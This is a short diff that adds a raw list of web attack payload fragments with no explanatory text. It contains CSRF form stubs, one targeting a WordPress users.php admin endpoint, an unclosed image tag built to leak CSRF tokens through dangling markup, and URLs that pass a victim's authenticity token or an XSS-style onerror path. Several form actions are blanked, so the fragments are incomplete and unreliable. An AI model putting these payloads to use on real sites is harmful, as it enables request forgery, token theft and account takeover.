@@ -1,0 +1,8 @@
+<form action="                            ">
+<form action="[domain]/wp-admin/users.php">
+<form method="POST" action="                                         ">
+<img src='https://target.com/steal_csrf_token?html=
+<input type="hidden" name="authenticity_token" value=""/>
+https://target.com/[attacker's_app]?authenticity_token=[victim's_token]
+https://target.com/img-src-x-onerror-prompt2?reveal_support=true?authenticity_token=[Your_CSRF_TOKEN]&utf8=%E2%9C%93
+target.com/[app_id]?authenticity_token=[current_user_authenticity_token]
